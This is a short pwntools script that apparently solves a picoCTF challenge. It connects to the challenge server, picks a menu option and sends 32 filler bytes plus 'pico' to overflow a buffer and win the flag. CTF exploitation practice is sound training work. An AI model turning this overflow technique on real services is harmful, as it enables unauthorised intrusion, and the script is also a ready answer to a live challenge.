from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
#io = elf.process()
io = remote("tethys.picoctf.net", 60564)
#context.log_level = "debug"

payload = b"A" * 32 + b"pico"

io.sendlineafter(b": ", b"2")
log.info("Sending payload")
io.sendlineafter(b": ", payload)
io.sendlineafter(b": ", b"4")

io.recvuntil(b"YOU WIN\n")
flag = io.recvline().strip()
log.success(flag.decode())

io.close()
